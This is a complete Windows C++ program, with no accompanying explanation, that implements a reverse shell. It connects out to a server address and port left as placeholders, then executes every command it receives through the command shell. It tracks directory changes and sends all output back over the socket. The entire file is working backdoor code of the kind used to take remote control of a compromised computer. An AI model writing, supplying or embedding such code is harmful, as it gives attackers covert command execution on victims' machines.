#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <array>
#include <memory>
#include <stdexcept>
#include <string>
#include <direct.h>

#pragma comment(lib, "ws2_32.lib")

#define DEFAULT_PORT "port"
#define DEFAULT_SERVER_ADDRESS "ip"

std::string exec(const char* cmd) {
    std::array<char, 128> buffer;
    std::string result;
    std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd, "r"), _pclose);

    if (!pipe) {
        result = "popen() failed!";
        return result;
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    return result;
}

int main() {
    WSADATA wsaData;
    int iResult;

    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        std::cerr << "WSAStartup failed: " << iResult << std::endl;
        return 1;
    }

    struct addrinfo hints, *result = nullptr, *ptr = nullptr;

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    iResult = getaddrinfo(DEFAULT_SERVER_ADDRESS, DEFAULT_PORT, &hints, &result);
    if (iResult != 0) {
        std::cerr << "getaddrinfo failed: " << iResult << std::endl;
        WSACleanup();
        return 1;
    }

    SOCKET connectSocket = INVALID_SOCKET;

    for (ptr = result; ptr != nullptr; ptr = ptr->ai_next) {
        connectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
        if (connectSocket == INVALID_SOCKET) {
            std::cerr << "Error at socket(): " << WSAGetLastError() << std::endl;
            freeaddrinfo(result);
            WSACleanup();
            return 1;
        }

        iResult = connect(connectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
        if (iResult == SOCKET_ERROR) {
            closesocket(connectSocket);
            connectSocket = INVALID_SOCKET;
            continue;
        }

        break;
    }

    freeaddrinfo(result);

    if (connectSocket == INVALID_SOCKET) {
        std::cerr << "Unable to connect to server!" << std::endl;
        WSACleanup();
        return 1;
    }

    std::cout << "Connected to server." << std::endl;

    char currentDirectory[FILENAME_MAX];
    _getcwd(currentDirectory, sizeof(currentDirectory));

    while (true) {
        char recvbuf[512];
        int recvbuflen = 512;
        iResult = recv(connectSocket, recvbuf, recvbuflen, 0);
        if (iResult > 0) {
            recvbuf[iResult] = '\0';
            std::cout << "Command received: " << recvbuf << std::endl;

            std::string command(recvbuf);

            if (command.find("cd ") == 0) {
                std::string newDir = command.substr(3);
                if (_chdir(newDir.c_str()) == 0) {
                    _getcwd(currentDirectory, sizeof(currentDirectory));
                    std::string response = "Directory changed to " + std::string(currentDirectory);
                    send(connectSocket, response.c_str(), response.length(), 0);
                } else {
                    std::string response = "Directory not found: " + newDir;
                    send(connectSocket, response.c_str(), response.length(), 0);
                }
            } else {
                std::string full_cmd = "cd /d \"" + std::string(currentDirectory) + "\" && " + command;
                std::string output = exec(full_cmd.c_str());
                if (output.empty()) {
                    output = "Command executed successfully with no output.";
                }
                if (send(connectSocket, output.c_str(), output.length(), 0) == SOCKET_ERROR) {
                    std::cerr << "Send failed: " << WSAGetLastError() << std::endl;
                    closesocket(connectSocket);
                    WSACleanup();
                    return 1;
                }
            }
        } else if (iResult == 0) {
            std::cout << "Connection closed by server" << std::endl;
            closesocket(connectSocket);
            break;
        } else {
            std::cerr << "Recv failed: " << WSAGetLastError() << std::endl;
            closesocket(connectSocket);
            WSACleanup();
            return 1;
        }
    }

    closesocket(connectSocket);
    WSACleanup();

    return 0;
}
